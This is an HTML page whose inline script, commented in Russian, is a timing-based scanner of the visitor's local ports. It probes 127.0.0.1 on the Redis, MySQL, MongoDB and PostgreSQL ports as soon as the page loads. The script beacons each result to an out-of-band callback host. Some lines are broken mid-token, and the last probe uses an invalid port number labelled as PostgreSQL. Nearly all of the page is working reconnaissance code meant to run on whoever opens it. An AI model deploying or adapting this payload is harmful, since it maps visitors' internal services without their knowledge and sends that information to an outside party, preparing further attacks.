<!DOCTYPE html>
<html>
<body>
    <script>
        const hook = "https://zmsfeowzqscjsayavbfe5bypi9ion50ff.oast.fun";
        function probe(url, port) {
            const start = Date.now
();
            const img = new Image();
            
            // Если порт открыт, но это не картинка - сработает onerror, но БЫСТРО
            // Если порт закрыт - сработает onerror, но МЕДЛЕННО (таймаут)
            img.onerror = () => {
                const duration = Date.now
() - start;
                navigator.sendBeacon(`${hook}/PROBE_${port}?time=${duration}`);
            };
            
            img.src = `${url}:${port}/favicon.ico`;
        }
        // Проверяем самые сочные порты
       probe("http://127.0.0.1
", "6379"); // Redis (часто без пароля внутри)
probe("http://127.0.0.1
", "3306"); // MySQL
probe("http://127.0.0.1
", "27017"); // MongoDB
probe("http://127.0.0.1
", "5432"); // PostgreSQL
        probe("http://127.0.0.1
", "54356782"); // PostgreSQL
    </script>
</body>
</html>
